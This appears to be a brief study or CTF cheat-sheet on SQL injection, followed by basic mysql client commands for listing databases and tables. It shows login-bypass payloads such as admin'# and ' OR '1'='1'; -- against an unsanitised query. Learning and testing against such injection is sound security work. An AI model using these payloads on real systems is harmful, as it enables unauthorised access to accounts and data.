#### SQL Injection

Exploiting SQL databases through unsanitized input.
- Example: `admin'#` to comment out the rest of the SQL query.

SELECT * FROM users WHERE username = '<input_username>' AND password = '<input_password>';
exploit:
	' OR '1'='1'; --


#### `mysql` and `MariaDB`

To connect to SQL databases:
mysql -h <hostname> -u <user>

Some useful SQL commands:
- `SHOW DATABASES;`
- `USE {database};`
- `SELECT * FROM {table};`
